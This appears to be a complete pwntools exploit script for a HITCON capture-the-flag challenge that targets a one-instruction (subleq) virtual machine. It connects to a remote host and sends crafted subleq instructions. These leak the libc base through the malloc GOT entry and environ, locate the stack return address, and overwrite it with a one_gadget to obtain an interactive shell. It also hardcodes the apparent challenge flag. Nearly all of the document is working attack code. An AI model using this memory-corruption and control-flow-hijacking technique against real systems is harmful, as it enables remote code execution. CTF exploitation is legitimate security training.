#!/usr/bin/python3
from pwn import *

elf = ELF("./lessequalmore_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf
context.terminal = ["tmux", "splitw", "-h"]

#p = process(["./lessequalmore_patched", "../dist/chal.txt"])
p = remote("34.81.247.217", 11111)


def send_int(n):
    if n >= 0:
        p.sendline(f"%{n}")
    else:
        n+=(1<<64)
        p.sendline(f"%{n}")

def send_ints(ns):
    for i in ns:
        send_int(i)

def send_str(s):
    for i in s:
        send_int(ord(i))

flag = "hitcon{r3vErs1ng_0n3_1ns7ruction_vm_1s_Ann0ying_c9adf98b67af517}"
# 64+1 -> input
# 16+1 -> buf
# 64 -> target
# 20+1 -> prompt
# 12+1 -> prompt2
# 27+1 -> win
# 18+1 -> lose
padding = sum([64+1, 16+1, 64, 20+1, 12+1, 27+1, 18+1])
mem = 1024
print(padding)
#send_str("\x00"*(64+1+16+1+64+20+1))
#send_str("a"*(12+1+27+1+18+1))

cur_ip = 16
def subleq(a, b, target=None):
    global cur_ip
    cur_ip += 3
    if target:
        return [a, b, target]
    else:
        return [a, b, cur_ip]

def to_data(idx):
    return 19+idx

# data:
# stack offset
# r shift amount
# overflow base
# 1
# one_gadget
one_gadget = [0x50a37, 0xebcf1, 0xebcf5, 0xebcf8][2]

data = [1, libc.symbols['malloc'], 0x148 - (0x84000 - 0x10), 1<<56, 52, -1*one_gadget]
print(data)
shellcode = subleq(0, 0, cur_ip + 3 + len(data))
cur_ip+=len(data)
# data
shellcode+= data
shellcode+= subleq(1, 1)
shellcode+= subleq(to_data(0), 1) # get -1
shellcode+= subleq(2, 2)
shellcode+= subleq(3, 3)
shellcode+= subleq(4, 4)
libc_malloc = libc.got['malloc'] + 0x84000 - 0x10 # libc_offset + mmap size - heap chunk header
shellcode+= subleq(libc_malloc//8, 2)
shellcode+= subleq(2, 3)
shellcode+= subleq(to_data(1), 3) # libc base
libc_environ = libc.symbols['environ'] + 0x84000 - 0x10 # libc_offset + mmap size - heap chunk header
shellcode+= subleq(2, 2)
shellcode+= subleq(libc_environ//8, 2)
shellcode+= subleq(2, 4)
shellcode+= subleq(3, 4) # subtract libc_base
shellcode+= subleq(to_data(2), 4) # subtract offset from libc_base & from environ
shellcode+= subleq(2, 2)
shellcode+= subleq(5, 5)
shellcode+= subleq(4, 2)
shellcode+= subleq(2, 5)
shellcode+= subleq(7, 7) # counter
shellcode+= subleq(2, 2)
# divide by 8
# 
div_label = cur_ip
shellcode+= subleq(2, 2)
shellcode+= subleq(2, 2)
shellcode+= subleq(5, 2)
shellcode+= subleq(5, 2) # [3]->-2n
shellcode+= subleq(5, 5)
shellcode+= subleq(2, 5) # [5]->2n

shellcode+= subleq(6, 6)
shellcode+= subleq(2, 6) # [6]->2n
shellcode+= subleq(to_data(3), 6, cur_ip+12) #[if 1<<56 < [6]] continue
shellcode+= subleq(to_data(3), 5) # [5] -= 1<<56
shellcode+= subleq(1, 5)          # [5] += 1
shellcode+= subleq(0, 0)
shellcode+= subleq(0, 0)
shellcode+= subleq(0, 0)
shellcode+= subleq(1, 7) # counter += 1

shellcode+= subleq(8, 8)
shellcode+= subleq(2, 2)
shellcode+= subleq(7, 2) 
shellcode+= subleq(2, 8) # [8] = counter
shellcode+= subleq(to_data(4), 8, div_label)
# now [5] points to return address
shellcode+= subleq(2, 2)
shellcode+= subleq(0, 0)
shellcode+= subleq(2, 2)
shellcode+= subleq(5, 2)
shellcode+= subleq(2, cur_ip+6)
shellcode+= subleq(2, cur_ip+4)
shellcode+= subleq(0, 0)
shellcode+= subleq(to_data(5), 3)
shellcode+= subleq(3, 11)
shellcode+= subleq(2, cur_ip+4)
shellcode+= subleq(11, 0)
shellcode+= subleq(0, 0, -2)

send_ints(shellcode)

send_str("\x00" * (mem - len(shellcode)))

gdb_script = """
handle SIGSEGV stop nopass
c 
set $rax=$rbx
b *op1
b *run_program+165
"""

#gdb.attach(p, gdb_script)

jmp_table = [1070,1134,1362,1558,1754,1950,2211,2456,2717,2962,3094,3110,3389,3521,3717,3720,3916,3919,4198,4333,4503,4906,5185,5325,5429,5754,25688,42696,43215,43715]
print(len(jmp_table))
jmp_table = [16] * len(jmp_table)
send_ints(jmp_table)
p.interactive()




